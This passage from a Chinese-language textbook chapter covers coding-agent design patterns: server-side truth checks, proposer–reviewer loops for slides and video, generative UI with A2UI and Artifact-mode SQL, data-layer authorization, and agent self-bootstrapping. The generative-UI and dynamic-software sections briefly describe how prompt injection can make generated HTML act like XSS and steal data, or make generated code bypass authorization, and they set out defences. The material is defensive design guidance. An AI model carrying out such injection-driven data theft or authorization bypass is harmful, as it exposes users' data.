**三重保障**：① 系統提示詞自然語言規則（理解與解釋）；② 工具描述與參數設計（呼叫前 checklist）；③ 服務端真值程式碼化校驗（最後守門員）。**前兩重減少錯誤發生，第三重確保錯誤不會變成不可逆的損失。**

> 對照 Ferguson《Cryptography Engineering》：「永遠不要信任來自對方的值」——伺服器以自己的資料庫和時鐘為準，就像協定中驗證者必須自己計算 MAC，而不是相信對方附上的「驗證結果」。

> **實驗 5-5 ★★ 小模型靠程式碼化知識執行規則**（Qwen3-4B、τ-bench 航空）
> - 控制組：純自然語言規則；實驗組：三重保障。
> - 指標：成功率、政策違規次數、無效工具呼叫次數、使用者體驗。
> - 預期：實驗組顯著更好；觀察到模型在**準備參數時就自主識別違規**、直接提議替代方案；統計 `expected_*` 與真值不一致比例，驗證真值校驗的必要。

## 14. 方向三：程式碼驅動的多媒體生成 ⭐⭐

GUI 所見即所得對 Agent 既不直觀也不高效（需要視覺理解與精確座標）；程式碼讓每個元素的位置、樣式、內容都明確定義。

### 14.1 PPT 生成：提議者—審核者

用 **Slidev**（Markdown + HTML 定義投影片）。但**Agent 寫完程式碼並不知道實際渲染效果**——太擠？文字溢位？圖片尺寸？只有渲染出來才知道。

```
Proposer Agent：讀內容 → 拆頁 → 生成 Slidev 程式碼
       ↓                                    ↑ 結構化改進建議
Reviewer Agent：渲染每頁成圖片 → Vision LLM 檢查
       （內容密度、可讀性、佈局、美感）
       → 「第 3 頁：內容過多，建議拆分」「第 7 頁：程式碼塊字型過小，建議 14pt」
         含頁碼、問題型別、嚴重程度欄位
迭代直到「品質達標」或「最大輪數（如 5）」——Loop 工程的兩類顯式終止條件
```

**與第四章事前審批同源、形態不同**：

| | 第四章事前審批 | 本章內容迭代 |
|---|---|---|
| 目標 | 不可逆操作的安全審查 | 內容品質的迭代改進 |
| 形態 | 對單次操作批准/否決 | **多輪迴圈** |
| 資訊 | 兩者看到相似資訊 | **審核者接觸提議者看不到的新資訊（渲染結果）** |

共同原則：共享目標約束、不同模型家族、回饋作為特殊事件加入 Proposer 軌跡。

**為什麼用雙 Agent 而非單 Agent 自我迴圈？核心優勢在上下文管理**：Reviewer 每次只看最新版渲染圖、不受歷史干擾；Proposer 只累積結構化文字回饋，token 少、易推理。單 Agent 要在同一上下文累積數十頁 × 多輪的渲染圖 → 迅速超限。

> **實驗 5-6 ★★ 論文 → PPT**：10–20 頁、至少 3 處原圖表且與文字匹配、無溢位；對比單 Agent 自審 vs. 雙 Agent 的上下文消耗與品質。
>
> **實驗 5-7 ★★ 論文 → 講解影片**：每頁生成口語化講解（**引導性敘述而非複述**）→ TTS → ffmpeg 合成；5–15 分鐘，每頁時長與語音精確匹配。

### 14.2 影片編輯：API 取代 GUI

剪輯軟體 GUI 極複雜（時間軸、圖層、效果面板），精確座標很難 → 改用 **Blender Python API**、**FFmpeg**；同樣用提議者—審核者（渲染關鍵幀給 Vision LLM 看）。

> **實驗 5-8 ★★ 基於 API 的影片剪輯**（素材含衝浪、徒步、滑雪；「把衝浪部分剪出來」）
> - **兩步定位**（封裝為影片分析子 Agent，避免截圖塞爆主上下文）：
>   1. 粗粒度：每 10 秒截圖 → Vision LLM → 「衝浪在第 40–110 秒」；
>   2. 細粒度：窄範圍、每秒截圖 → 精確邊界。
> - 生成 Blender 指令碼 → Reviewer 快速預覽 → 迭代 → 完整渲染。
> - 驗收：起止點誤差 ≤ 3 秒；特效（慢動作、轉場、字幕）正確；Reviewer 能偵測遺漏或無關片段。

### 14.3 3D 與工業零件：程式碼 vs. 生成模型的邊界 ⭐⭐

兩條路：寫程式碼精確構造（CadQuery、OpenSCAD、Blender API）vs. 呼叫 3D 生成模型（混元 3D，diffusion 一系）。

| 判準 | 程式碼路線 | 生成模型路線 |
|---|---|---|
| **一看：有沒有緊湊的精確描述** | 法蘭盤：外徑、厚度、孔位圓直徑、孔徑、孔數——五六個參數，程式碼是**無損表達** | 綠植、太湖石、人臉：**內在複雜度近乎無限** |
| **二看：精度與可驗證性** | 孔徑 5mm ± 0.05mm 是硬約束；可**程式化驗證**（載入網格量尺寸） | 無法直接跟規格核對 |
| **表示形式與可編輯性** | **B-rep** 參數化實體（STEP：特徵樹 + 尺寸參數，可驅動 CNC） | 三角面片網格，放大坑坑窪窪 |
| 「M5 改 M6」 | 改一個數字重跑，其餘分毫不差 | 只能整體重生成，其餘尺寸跑不跑偏**全憑運氣** |

> 走哪條路本身就是一次 Agent 決策；也可以混著走——幾何體用程式碼參數化、表面紋理交給生成模型。

> **實驗 5-9 ★★ 同一零件兩條路線**：「法蘭盤，外徑 80mm，厚度 10mm，4 個均佈 M5 安裝孔，孔位圓直徑 60mm」→ 量測偏差與安裝面平整度 → 發出 M5→M6 變更記錄修改成本。**對照組**：生成一盆綠植，優劣正好反轉（程式碼即便加程式化噪聲也僵硬，生成模型自然生動）。

## 15. 方向四：程式碼作為系統介面卡 ⭐⭐

前幾節是「面向人」的產物；這一節是**連線機器與機器**。外部服務常無 SDK、文件缺失、格式非標準、欄位隨版本漂移 → Agent 當場讀文件或觀察一兩條真實響應，即時生成 HTTP 用戶端、鑑權頭、解析邏輯、資料模型翻譯——**「萬能膠」**。

- 延伸到**完全沒有 API 的系統**：先用 Computer Use 操作介面，再把成功的操作序列固化為 **RPA** 工具——之後直接跑程式碼，不再呼叫昂貴的視覺思考（第九章「工作流錄製與固化」）。
- 資料格式不斷演化，手寫解析維護成本極高 → **遇到新格式時依樣本臨時生成解析程式碼**。

**自動修復回饋迴圈（Agent 日誌視覺化）**：

```
前端無法解析某日誌格式 → 不顯示錯誤，而是把原始樣本 + 詳細報錯報告給 Agent
  → Agent 分析結構、生成前端解析程式碼
  → 虛擬瀏覽器自動測試（驗證解析正確 + Vision LLM 檢查視覺化效果）
  → 熱更新到前端
```

> **實驗 5-10 ★★★ 適應性日誌解析**：初始只支援基本格式；全流程自動化。
>
> **實驗 5-11 ★★★ 生產日誌智慧診斷**：讀生產軌跡 + 架構文件 + PRD → 判斷執行流程是否符合預期、定位模組 → 結構化問題報告（優先順序、模組、描述、建議）→ **迴歸測試用例**（引用軌跡 ID 與互動輪次，測試框架自動重放）→ 透過 MCP 對接 GitHub 建 Issue 並分派。

## 16. 方向五：程式碼作為生成式 UI ⭐⭐⭐

純文字是線性、單一的互動：收集結構化資訊要反覆問答；複雜資料關係難表達；多選項不如視覺化直觀。**生成式 UI（Generative UI）**：Agent 動態生成表單、互動圖表、甚至完整 Web 應用。

### 16.1 A2UI：宣告式介面協定

- 直接生成 HTML/JS 的安全問題：**成因是提示注入**（惡意指令混進輸入），**效果類似 XSS**（瀏覽器執行惡意指令碼竊取資料）——不能把整個攻擊叫 XSS。
- **A2UI（Agent-to-User Interface）**：Agent 只輸出 JSON「介面描述清單」（「顯示一個 3 行 2 列、標題『銷售資料』的表格」），用戶端用**受信任元件目錄**（Card、Button、TextField、Table）以原生元件渲染。

  > 像餐廳選單：顧客（Agent）只能點選單上有的菜，不能走進廚房自己做。

- 通常還支援**跨平台**（React、Flutter、原生）與**增量生成**（串流 JSONL，邊收邊渲染）。
- **別混淆 AG-UI**（CopilotKit）：不是介面描述語言，而是**事件/傳輸協定**——把 Agent 執行狀態（訊息、工具呼叫、狀態補丁）串流推到前端，甚至可以承載 A2UI 載荷。**二者互補而非同類。**
- 宣告式適合標準化互動（表單、表格、卡片）；高度客製（自訂視覺化、遊戲）仍是直接生成程式碼更靈活。

### 16.2 用 HTML 交付成果，取代 Markdown 彙報

| 優勢 | 說明 |
|---|---|
| **互動式演示** | 可操作地演示系統怎麼運作，一看就懂 |
| **更好的資料視覺化** | 用圖表而非表格；可篩選、下鑽 |
| **可持續完善的交付件** | 不是任務結束才產出的死物，而是 Agent 隨工作推進不斷補充 |

**作者的研究專案網站**（01.me/research）——一份活文件，三類作用：
1. **實驗資料追溯**：每次實驗的資料、prompt、LLM 原始回覆逐條可看 → 更容易發現資料構造/格式/分佈問題、judge 打分的系統性偏差；
2. **訓練指標監控**：「**內科指標**」——訓練/驗證損失、梯度範數、學習率、困惑度、RL 中的獎勵、KL 散度、策略熵。不同於任務準確率等結果指標，就像體檢的生理指標，**能更早暴露損失不收斂、梯度爆炸、訓練崩潰**；
3. **執行原理展示**：視覺化 AI 搭起來的系統結構。

### 16.3 澄清使用者意圖：動態表單

文字問答（如 OpenAI Deep Research）：十個澄清點要十輪；問題間的依賴關係（目的地影響交通方式）難表達。→ 生成 HTML 表單（文字框、下拉、核取方塊、日期選擇器）+ **級聯邏輯**（JS 動態顯示/隱藏後續問題），一次填完。

> **實驗 5-12 ★★**：「我想訂一張去北京的機票」→ 出發城市、出發日期、單程/往返、返程日期（僅選往返時顯示）；一次提交，Agent 解析 JSON 繼續任務。

### 16.4 生成 SQL：Artifact 模式 ⭐⭐

| 方案 | 做法 | 問題 |
|---|---|---|
| Agent 執行 SQL 再用文字描述結果 | LLM 讀幾千行表格再複述 | 費 token、耗時、**LLM「抄寫」資料極易出錯** |
| **Artifact 模式** | Agent 只生成 SQL，作為**可執行產物**交給系統；系統直接查庫並渲染表格 | 資料從資料庫**直達使用者介面**，繞過 LLM 這個「中間人」 |

進一步：**兩個 artifact 組成流水線**——SQL + 視覺化程式碼（柱狀圖），前端把 SQL 結果直接餵給視覺化程式碼，LLM 不參與資料傳遞。

**但生成的程式碼不得直接執行**：
- 唯讀資料庫憑證；**解析 SQL**，只允許核准的 `SELECT`，拒絕 DDL、DML、多語句；
- 使用者值由伺服器端**參數綁定**；
- 限制查詢時間、返回行數、可存取的表與日期範圍；
- 視覺化程式碼在與網路和檔案系統隔離的沙盒中執行，只能產生核准的結果格式。

> **Artifact 模式縮短了資料路徑，但不能取代授權檢查與執行隔離。**

> **實驗 5-13 ★★ 自然語言 ERP Agent**（PostgreSQL：員工表 + 工資表）十題，例：平均在職多久？各部門在職人數？今年與去年各新入職多少？前年 3 月到去年 5 月 A 部門平均工資？漲薪幅度前 10？**有沒有拖欠工資**（某月在職但未發薪）？

### 16.5 動態生成軟體

- **Imagine with Claude**：即時生成前端與互動邏輯，使用者互動後 Claude 改碼生成新介面——展示能力邊界，但成本與延遲高。
- 更務實：**基於已有框架的「半定製」**——「把按鈕改成藍色」「側邊欄加快捷選單」→ 改前端程式碼 → **HMR** 熱替換即時生效 → 「千人千面」。

> **實驗 5-14 ★★ 對話式介面定製**：React（HMR）+ FastAPI（reload），多輪迭代定製顏色、字型、佈局。

### 16.6 ⭐⭐⭐ 動態軟體的安全：把信任邊界下移到資料層

- 傳統：業務程式碼經開發、審查、測試、部署後相對穩定 → 授權檢查放應用層。
- 動態軟體：Agent 隨時重寫介面、流程、甚至資料存取程式碼 → 新程式碼可能**漏掉授權檢查、暴露隱藏欄位、走另一條路徑繞過檢查**；無論是普通生成錯誤還是注入後的惡意程式碼，結果一樣。

> **安全目標不應是「確保 AI 正確寫出每一個授權檢查」，而是「即使 AI 寫出錯誤程式碼，權限約束仍然無法被繞過」。**

- 若授權檢查在動態生成的業務邏輯中，它和需要被限制的程式碼**處於同一信任域**——提示詞、測試、審查能降低錯誤率，但無法窮舉未來版本的所有執行路徑。

**架構**：

```
┌───────── 動態生成（可持續變動）─────────┐
│ 呈現、工作流程、業務編排；可做預檢查改善體驗 │
└──────────────┬──────────────────────┘
               │ 只拿到受限身分（使用者/租戶/角色/Agent 身分，
               │ 由可信執行環境綁定的「存取上下文」）
┌──────────────▼──────────────────────┐
│ 穩定、經人工審查的資料層（最終裁決權）       │
│ 列層級安全（RLS）、約束與驗證器、             │
│ 受控檢視表 / 儲存程序 / 資料存取服務           │
└─────────────────────────────────────┘
```

- 生成程式碼不能偽造身分，也拿不到能繞過規則的高權限憑證；**所有資料存取路徑都必須經過可信資料層**。
- 授權下移 ≠ 把全部業務邏輯塞進資料庫：上層預檢查改善體驗，下層提供保證。
- 這就是第一章三層護欄中**最難被繞過的資料層**。

> 對照 Hanson《C Interfaces and Implementations》：把不變量放在**抽象資料型別的實作內部**，讓呼叫者無論怎麼寫都無法破壞它——這裡的「呼叫者」是會被重寫的 AI 程式碼，「ADT 實作」是穩定的資料層。

> **實驗 5-15 ★★★ 權限內嵌資料物件**：PostgreSQL 之上的 Python 物件儲存中介層；型別宣告權限規則、存取上下文、驗證器、物件關係與後果反應；每次讀寫依序經權限與驗證流水線、持久化、參照完整性驗證。驗收（招聘流程）：有效更新成功；**拒絕跳過候選人狀態轉換、寫入超出職位範圍的薪資、跨租戶讀取**。

## 17. 方向六：程式碼創造程式碼——Agent 自舉 ⭐⭐

### 17.1 自我修復：OpenClaw `doctor`

| 偵測類別 | 例子 |
|---|---|
| 配置異常 | 過期 OAuth token、遺留配置格式、埠衝突 |
| 狀態問題 | 陳舊會話鎖檔、外掛依賴缺失 |
| 服務健康 | 閘道器未執行、沙盒映像缺失 |

分層修復：安全的（配置歸一化、清鎖檔）自動做；有風險的（重啟服務、強制覆蓋配置）需使用者確認。

> **避免誇大**：高頻問題本有明確偵測規則與固定修復動作——`doctor` **先以確定性檢查覆蓋**（與傳統維運指令碼無本質不同）。真正體現 Agent 能力的是**第二層**：確定性規則沒覆蓋的長尾疑難，才交給 LLM 分析日誌、理解配置語義、推因果、生成修復方案。**確定性檢查保證常見問題穩定修復，LLM 兜底長尾。**

當 Agent 的工作物件從外部系統變成**它自身的執行環境**，自我修復就從系統介面卡升級為自舉的基礎設施。

### 17.2 讓 Agent 編寫 Agent

**常見缺陷**（缺乏 Agent 領域知識時）：
1. **上下文管理隨意**：不用標準上下文格式、把軌跡轉純文字塞進去、忽略結構化訊息的 KV Cache 最佳化、工具呼叫迴圈有邊界 bug；
2. **工具設計不規範**：描述簡略、缺邊界與負面清單、參數缺例子；
3. **技術選型滯後**：偏向訓練資料中最常見但**已過時**的模型與 API → 維護 SOTA 知識庫或給搜尋能力；
4. **外部生態脫節**：廢棄 API、不再維護的庫、有缺陷的模式。

> **最有效的路徑不是在提示詞裡窮盡規則，而是提供高品質 Agent 實作作為參考範例**，讓程式碼生成 Agent 在其上修改。

「**自我複製並適應性修改**」：先複製自己的程式碼（或其他驗證過的實作）→ 調系統提示詞匹配新角色 → 增刪工具 → 改業務邏輯但保留架構框架。像生物學中的**基因複製加變異**。

> **實驗 5-16 ★★★ 能創造 Agent 的 Agent**：以 `ch5/coding-agent` 本身為範例；驗收：新 Agent 能跑、用標準訊息格式與工具協定、用當前推薦模型與 API、多輪上下文與狀態正確；**對比從零生成 vs. 基於範例修改**。

## 18. 設計觀念整理

| 觀念 | 本章體現 |
|---|---|
| **通用 Agent ＝ Coding Agent ＋ 檔案系統** | 七個工具 + MEMORY.md；幾乎所有內容生成都歸結到程式碼 |
| **基礎設施就是 Harness** | Coding Agent 成熟度高靠的是測試、型別、Git，而非模型特別強 |
| **約束優先於指導** | Linter/CI 是「做不了」，提示詞只是「建議別做」；約束動作而非僅結果 |
| **錯誤是輸入，不是終點** | 工具層錯誤回給模型；恢復迴圈是錯誤處理的邊界；中間態不外洩 |
| **每條恢復路徑都要有上限** | 熔斷閾值來自產線資料；錯誤路徑停用會再呼叫模型的邏輯 |
| **中立表示讓軌跡可攜** | 文字可移植、憑證不可；同一產物支撐評估、訓練、經驗提取 |
| **為模型的工作模式設計介面** | 模型是「長思考 + 批次操作」，不是人類的「看一步做一步」 |
| **理解勝過匹配** | 命令語義解析取代黑名單 |
| **獨立性 = 獨立模型 + 獨立資料來源** | τ-bench 守門員只信資料庫與服務端時鐘 |
| **繞過 LLM 中間人** | Artifact 模式讓資料直達使用者 |
| **信任邊界放在不會被重寫的層** | 動態軟體的授權下移到資料層 |
| **鷹架厚度取決於模型能力** | 同一技術在強弱模型上結論不同 |
| **按內在複雜度選路** | 有緊湊精確描述用程式碼，近乎無限細節用生成模型 |
| **基於範例生成** | 自舉時複製驗證過的實作再修改 |

## 22. 本章重點整理

1. **通用 Agent ＝ Coding Agent ＋ 檔案系統**；七個核心工具（Interpreter、Bash、Read、Write、Edit、Glob、Grep）就夠；Codex 甚至只有 shell + `apply_patch`。
2. 幾乎所有內容生成都歸結到程式碼（OOXML、Markdown/HTML/LaTeX、Python）；Markdown 記憶可讀可改、保時序、可 Git。適用於開放任務；垂直客服裡程式碼只是一件工具。
3. 工作流：**文件化 → 澄清 → 設計文件審查 → 實現 → 測試—修復 → 自審 → 文件同步**；專案指令檔案是專案級系統提示詞與最經濟的穩定前綴；**「測試通過」才是完成**。
4. **Harness 是 Coding Agent 成熟的真正原因**；四原則：約束優先、驗證自動化、回饋快且結構化、回退可靠；約束**過程**而不只是結果。
5. **故障四層**（API、工具、上下文、控制流）；先分類再計數（指紋、連續失敗、看門狗）；**分級恢復**（靜默重試 → 降級接續 → 暴露）；工具錯誤回給模型；恢復迴圈是錯誤邊界。
6. **跨廠商接管**：文字可移植、憑證不可；軌跡存中立格式。
7. **終止**：熔斷上限來自產線資料（Claude Code 3 次）；防死亡螺旋要停用錯誤路徑上的模型呼叫 + 遞迴計數。
8. 實現技巧：串流執行與級聯中止、行號前綴、狀態列注入環境、持久化終端機、寫後即 lint。
9. 搜尋：grep、glob、語義、符號互補；**Claude Code 與 Cursor 現都以 grep + glob 現場檢索為主**。
10. 編輯五方案：Apply Model（Cursor）、Old→New String（Claude Code）、行號、Vim、首尾匹配；**模型是長思考批次操作，不是人類的看一步做一步**。
11. 安全：**致命三要素 + 持久記憶**；預設斷網、唯讀掛載、憑證不入沙盒、結構化逾時錯誤；**語義解析**而非黑名單；**忠誠度守則**——提示注入就是策反。
12. **元能力六方向**：思考（符號/約束求解，鷹架厚度看模型）、**業務規則**（checklist 參數 + **服務端真值守門**，獨立資料來源）、多媒體（提議者—審核者 + 渲染；程式碼 vs. 生成模型看內在複雜度）、系統介面卡（萬能膠、RPA、自動修復迴圈）、**生成式 UI**（A2UI vs. AG-UI、HTML 交付、動態表單、Artifact 模式、**授權下移到資料層**）、**自舉**（doctor 確定性優先、基於範例生成）。

> **一句話**：程式碼是 Agent 精確思考與表達的語言——用七個工具和一個檔案系統就能隨需創造能力，而真正讓它可靠的，是測試、型別、版本控制、沙盒、真值校驗與資料層權限這些「無論模型怎麼寫都繞不過」的基礎設施。
